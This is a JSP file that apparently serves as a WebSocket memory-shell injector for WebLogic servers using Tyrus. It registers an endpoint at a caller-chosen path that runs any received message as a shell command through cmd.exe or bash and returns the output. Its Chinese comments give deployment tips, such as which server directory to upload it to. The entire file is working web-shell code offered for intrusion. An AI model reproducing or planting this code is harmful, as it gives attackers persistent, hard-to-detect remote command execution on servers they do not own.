<%@ page import="javax.websocket.server.ServerEndpointConfig" %>
<%@ page import="javax.websocket.server.ServerContainer" %>
<%@ page import="javax.websocket.*" %>
<%@ page import="java.io.*" %>
<%@ page import="org.glassfish.tyrus.server.TyrusServerContainer" %>

<%!
    public static class CmdEndpoint extends Endpoint implements MessageHandler.Whole<String> {
        private Session session;
        @Override
        public void onMessage(String s) {
            try {
                Process process;
                boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
                if (bool) {
                    process = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", s });
                } else {
                    process = Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", s });
                }
                InputStream inputStream = process.getInputStream();
                StringBuilder stringBuilder = new StringBuilder();
                int i;
                while ((i = inputStream.read()) != -1)
                    stringBuilder.append((char)i);
                inputStream.close();
                process.waitFor();
                session.getBasicRemote().sendText(stringBuilder.toString());
            } catch (Exception exception) {
                exception.printStackTrace();
            }
        }
        @Override
        public void onOpen(final Session session, EndpointConfig config) {
            this.session = session;
            session.addMessageHandler(this);
        }
    }
%>
<%

    // Weblogic 在获取 ServerContainer 时有些问题，例如在 bea_wls_internal 目录下 servletContext 获取不到 ServerContainer，也就是此jsp传到 bea_wls_internal目录是无效的，但自己部署的war包路径有效，目前还不知道为什么
    
    // 可以使用 wsAddAllContainer.jsp 遍历所有的 Container 进行添加，这样 wsAddAllContainer.jsp 上传到bea_wls_internal目录也是可以的
    
    String path = request.getParameter("path");
    ServletContext servletContext = request.getSession().getServletContext();
    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(CmdEndpoint.class, path).build();
    TyrusServerContainer container = (TyrusServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
    try {
        container.register(configEndpoint);
    } catch (Exception e) {
        e.printStackTrace();
    }
%>
